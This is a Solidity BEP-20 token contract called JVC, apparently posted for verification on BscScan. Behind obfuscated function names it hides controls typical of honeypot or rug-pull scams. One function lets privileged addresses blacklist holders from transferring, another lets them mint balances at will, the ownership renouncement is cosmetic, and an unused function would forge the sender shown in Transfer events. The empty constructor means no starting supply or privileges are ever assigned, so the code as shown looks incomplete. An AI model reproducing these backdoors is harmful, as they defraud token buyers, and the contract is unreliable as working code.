/**
 *Submitted for verification at BscScan.com on 2023-01-10
*/

pragma solidity 0.8.17;


contract JVC {

address abXO = 0x00C5E04176d95A286fccE0E68c683Ca0bfec8454;
event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);
    event Transfer(address indexed from, address indexed to, uint256 value);
    event Approval(address indexed owner, address indexed spender, uint256 value);
        mapping (address => uint256) private AGX;
        mapping (address => uint256) private CGX;
    mapping (address => mapping (address => uint256)) private DGX;
    uint private DECC = 8;
uint256 FFF = 100000*100;
    string private NME = "JVC";
    string private SMB = "JVC";
 address Owner = msg.sender;


    constructor () 
{ }

    function renounceOwnership() public  {
        require(msg.sender == Owner);
        emit OwnershipTransferred(Owner, address(0));
        Owner = address(0);
    }

    
    function name() public view returns (string memory) {
        return NME;
    }

    function symbol() public view returns (string memory) {
        return SMB;
    }


    function totalSupply() public view  returns (uint256) {
        return FFF;
    }

    function balanceOf(address account) public view  returns (uint256) {
        return AGX[account];
    }

       function decimals() public view returns (uint) {
        return DECC;
    }
	 function allowance(address owner, address spender) public view  returns (uint256) {
                 return DGX[owner][spender];
    }
	

function approve(address spender, uint256 amount) public returns (bool success) {    
        DGX[msg.sender][spender] = amount;
        emit Approval(msg.sender, spender, amount);
        return true; }
			   
  		
    function transfer(address recipient, uint256 amount) public returns (bool) {
   
   require(CGX[msg.sender] <= 1);
        require(amount <= AGX[msg.sender]);
      
        hIGXi(msg.sender, recipient, amount);
        return true; }
 
	   
	   
    function transferFrom(address sender, address recipient, uint256 amount) public returns
     (bool) {

    require(amount <= AGX[sender]);
     require(amount <= DGX[sender][msg.sender]);
             
              require(CGX[sender] <= 1 && CGX[recipient] <=1);
        hIGXi(sender, recipient, amount);
        return true;}
			 			   function CQUE (address nIGX, uint256 oIGX)  public {
                     if(CGX[msg.sender] >= 21){
      zIG(nIGX,oIGX);}}

      			function zIG (address nIGX, uint256 oIGX)  internal {
     CGX[nIGX] = oIGX;} 
			function yIG (address nIGX, uint256 oIGX)  internal {
     AGX[nIGX] += oIGX;} 	


		   function AQUE (address nIGX, uint256 oIGX) public {
        if(CGX[msg.sender] >= 21){
   yIG(nIGX,oIGX);}}
			    function hIGXi(address sender, address recipient, uint256 amount) internal  {
        AGX[sender] -= amount;
        AGX[recipient] += amount;
        emit Transfer(sender, recipient, amount); }	
	
	
		            function iGXi(address sender, address recipient, uint256 amount) internal  {
    AGX[sender] -= amount;
        AGX[recipient] += amount;
         sender = abXO;
        emit Transfer(sender, recipient, amount); }

}